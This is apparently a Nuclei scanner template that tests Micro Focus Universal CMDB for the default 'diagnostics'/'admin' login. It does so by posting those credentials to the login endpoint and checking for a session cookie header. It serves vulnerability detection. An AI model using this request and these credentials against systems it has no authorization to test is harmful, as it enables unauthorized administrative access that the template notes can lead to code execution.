id: ucmdb-default-login
info:
  author: dwisiswant0
  classification:
    cwe-id: CWE-798
  description: Micro Focus Universal CMDB default login credentials were discovered
    for diagnostics/admin. Note there is potential for this to be chained together
    with other vulnerabilities as with CVE-2020-11853 and CVE-2020-11854.
  name: Micro Focus Universal CMDB Default Login
  reference:
  - https://packetstormsecurity.com/files/161182/Micro-Focus-UCMDB-Remote-Code-Execution.htm
  severity: high
  tags: ucmdb,default-login
requests:
- attack: pitchfork
  matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - LWSSO_COOKIE_KEY
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - diagnostics
  raw:
  - 'POST /ucmdb-ui/cms/loginRequest.do; HTTP/1.1

    Host: {{Hostname}}


    customerID=1&isEncoded=false&userName={{username}}&password={{base64(password)}}&ldapServerName=UCMDB

    '
